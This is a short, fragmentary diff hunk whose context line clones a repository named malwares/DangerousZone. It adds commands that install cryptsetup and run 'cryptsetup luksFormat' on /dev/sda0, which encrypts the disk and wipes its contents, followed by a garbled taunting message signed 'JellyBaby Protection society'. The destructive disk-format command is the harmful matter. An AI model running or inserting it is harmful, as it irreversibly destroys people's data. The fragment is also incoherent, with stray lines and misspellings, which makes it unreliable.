@@ -14,3 +14,11 @@ git clone https://github.com/malwares/DangerousZone
 <down>
 <down>
 >file 
+apt install cryptsetup 
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+>file
+All suffering is unsatisfactory.
+Unless you are taking someone else's peace away.
+Than you are fare game!
+Lots of love from the JellyBaby Protection society
+Xo xx xo 0x
